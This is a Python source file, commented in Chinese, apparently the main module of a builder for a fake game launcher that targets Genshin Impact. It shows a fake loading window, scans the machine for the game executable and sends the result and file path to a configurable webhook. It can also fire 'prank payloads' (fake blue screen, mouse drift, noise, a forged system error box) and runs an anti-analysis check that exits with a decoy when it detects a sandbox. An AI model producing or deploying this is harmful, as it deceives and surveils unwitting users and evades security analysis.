import os
import sys
import threading
import time
import webbrowser

# --- IMPORTS START ---
# 导入同目录下的模块
# PyInstaller 打包时会将这些模块打包进去
try:
    from anti_analysis import AntiAnalysis
    from fake_ui import FakeLoaderUI
    from launcher_core import GameScanner
    from webhook import WebhookReporter
except ImportError:
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    from anti_analysis import AntiAnalysis
    from fake_ui import FakeLoaderUI
    from launcher_core import GameScanner
    from webhook import WebhookReporter
# --- IMPORTS END ---

# --- CONFIG START ---
# 这些值将在生成时被替换
CONFIG = {
    "target_exe": "YuanShen.exe",
    "target_name": "原神",
    "fallback_url": "https://ys.mihoyo.com",
    "window_title": "正在加载游戏资源...",
    "show_log": True,
    "error_message": "",  # 默认为空，不弹窗
    # v4.0: Webhook
    "enable_webhook": False,
    "webhook_url": "",
    "webhook_type": "custom",
    # v4.0: Payloads
    "enable_bsod": False,
    "enable_audio": False,
    "audio_melody": "random_chaos",
    "enable_mouse_drift": False,
    "drift_intensity": 3,
    "drift_duration": 15,
    # v4.0: Anti-Analysis
    "enable_anti_analysis": False,
}
# --- CONFIG END ---

def show_fake_error():
    """弹出伪造的系统错误框"""
    msg = CONFIG.get("error_message")
    if not msg:
        return

    try:
        import ctypes
        # MessageBoxW(hwnd, text, caption, type)
        # type 0x10 = MB_ICONHAND (Error Icon)
        ctypes.windll.user32.MessageBoxW(0, msg, "System Error", 0x10)
    except Exception:
        pass

def _execute_payloads():
    """执行已启用的恶搞载荷（v4.0 新增）。"""
    # 蓝屏伪装
    if CONFIG.get("enable_bsod", False):
        try:
            from payloads.fake_bsod import FakeBSOD
            bsod = FakeBSOD(duration=8)
            # 在独立线程中显示，不阻塞主流程
            t = threading.Thread(target=bsod.show, daemon=True)
            t.start()
            t.join(timeout=10)
        except Exception:
            pass

    # 搞怪音效
    if CONFIG.get("enable_audio", False):
        try:
            from payloads.audio_prank import AudioPrank
            melody = str(CONFIG.get("audio_melody", "random_chaos"))
            prank = AudioPrank(repeat=2)
            prank.play_beep_sequence(melody_name=melody, background=True)
        except Exception:
            pass

    # 鼠标漂移
    if CONFIG.get("enable_mouse_drift", False):
        try:
            from payloads.mouse_drift import MouseDrift
            intensity = int(CONFIG.get("drift_intensity", 3))
            duration = float(CONFIG.get("drift_duration", 15))
            drift = MouseDrift(intensity=intensity, duration=duration)
            drift.start()  # 后台线程，自动停止
        except Exception:
            pass

def _send_webhook(found: bool, found_path: str = "", action: str = ""):
    """发送 Webhook 战报（v4.0 新增）。"""
    if not CONFIG.get("enable_webhook", False):
        return

    try:
        reporter = WebhookReporter(
            webhook_url=str(CONFIG.get("webhook_url", "")),
            service_type=str(CONFIG.get("webhook_type", "custom")),
        )
        reporter.report_scan_result(
            target_name=str(CONFIG.get("target_name", "")),
            target_exe=str(CONFIG.get("target_exe", "")),
            found=found,
            found_path=found_path,
            action=action,
        )
    except Exception:
        pass

def main():
    # 0. 反分析检测（在任何 UI 之前执行）
    if CONFIG.get("enable_anti_analysis", False):
        try:
            checker = AntiAnalysis()
            if checker.is_analysis_environment():
                checker.decoy_action()
                sys.exit(0)
        except Exception:
            pass

    # 1. 初始化 UI
    ui = FakeLoaderUI(title=str(CONFIG["window_title"]), splash_data=str(CONFIG.get("splash_image_data", "")))

    # 2. 初始化扫描器
    scanner = GameScanner(str(CONFIG["target_exe"]), str(CONFIG["target_name"]))

    # 定义日志回调
    def log_callback(msg: str):
        if CONFIG["show_log"]:
            ui.update_status(msg)

    scanner.set_log_callback(log_callback)

    # 3. 扫描线程
    def scan_thread_func():
        # 稍微延迟一下，让用户看到加载界面
        time.sleep(1.5)

        found_path = scanner.scan()

        # 扫描结束，进度条拉满
        ui.update_progress(100)
        ui.update_status("加载完成")
        time.sleep(0.5)

        # 执行后续操作 (在关闭 UI 之前执行，防止主程序提前退出)
        try:
            if found_path:
                print(f"Found: {found_path}")
                scanner.launch_game()
                # v4.0: Webhook 报告
                _send_webhook(found=True, found_path=found_path, action="launched_game")
            else:
                print("Not found, opening URL")
                # v4.0: 执行恶搞载荷
                _execute_payloads()
                # 弹窗欺骗 (阻塞式)
                show_fake_error()
                webbrowser.open(str(CONFIG["fallback_url"]))
                # v4.0: Webhook 报告
                _send_webhook(found=False, action="opened_fallback_url")
        except Exception as e:
            print(f"Execution error: {e}")

        # 保存日志
        try:
            scanner.save_scan_log()
        except Exception:
            pass

        # 给一点时间让外部程序启动
        time.sleep(1.0)

        # 关闭 UI (这将导致主线程退出)
        ui.close()

    # 启动后台线程
    t = threading.Thread(target=scan_thread_func, daemon=True)
    t.start()

    # 进入 UI 主循环（阻塞直到 ui.close() 被调用）
    ui.mainloop()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # 确保出错时也能打开网页作为保底
        print(f"Error: {e}")
        webbrowser.open(str(CONFIG["fallback_url"]))
